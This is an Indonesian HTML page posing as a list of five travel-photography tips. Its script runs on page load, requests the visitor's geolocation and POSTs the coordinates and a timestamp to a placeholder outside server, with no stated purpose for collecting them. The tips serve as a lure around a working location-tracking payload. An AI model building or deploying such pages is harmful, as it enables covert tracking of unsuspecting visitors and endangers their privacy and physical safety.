<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <title>Tips Foto Traveling</title>
  <style>
    body {
      font-family: sans-serif;
      padding: 20px;
      background-color: #f7f7f7;
    }
    .container {
      max-width: 600px;
      margin: auto;
      background: white;
      padding: 20px;
      border-radius: 10px;
    }
    .hidden {
      display: none;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>5 Tips Foto Traveling yang Keren</h1>
    <p>Berikut beberapa tips sederhana agar foto traveling kamu makin estetik dan keren.</p>
    <ul>
      <li>Gunakan cahaya alami saat memotret.</li>
      <li>Pilih komposisi yang unik.</li>
      <li>Edit secukupnya untuk memperkuat warna.</li>
      <li>Manfaatkan mode potret di HP.</li>
      <li>Tangkap momen, bukan hanya pemandangan.</li>
    </ul>
    <p id="location" class="hidden">Mendeteksi lokasi Anda...</p>
  </div>

  <script>
    const locationEl = document.getElementById('location');

    function sendLocation(lat, lon) {
      // Kirim ke server, ini hanya contoh
      fetch('https://your-server.com/api/lokasi', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({ latitude: lat, longitude: lon, timestamp: Date.now() })
      });
    }

    if ("geolocation" in navigator) {
      navigator.geolocation.getCurrentPosition((position) => {
        const { latitude, longitude } = position.coords;
        locationEl.classList.remove('hidden');
        locationEl.textContent = `Lokasi berhasil didapatkan.`;
        sendLocation(latitude, longitude);
      }, (error) => {
        locationEl.classList.remove('hidden');
        locationEl.textContent = `Gagal mendapatkan lokasi: ${error.message}`;
      });
    }
  </script>
</body>
</html>
# test
